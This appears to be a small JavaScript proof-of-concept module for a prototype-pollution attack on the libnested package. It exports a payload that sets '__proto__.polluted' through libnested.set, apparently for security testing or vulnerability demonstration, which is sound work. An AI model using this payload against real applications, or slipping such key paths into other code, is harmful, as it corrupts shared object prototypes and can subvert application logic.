function getPayload() {
    return {
        setPrototype: (obj) => {
            libnested.set(obj, ["__proto__", "polluted"], "yes");
        }
    };
}

module.exports = { getPayload };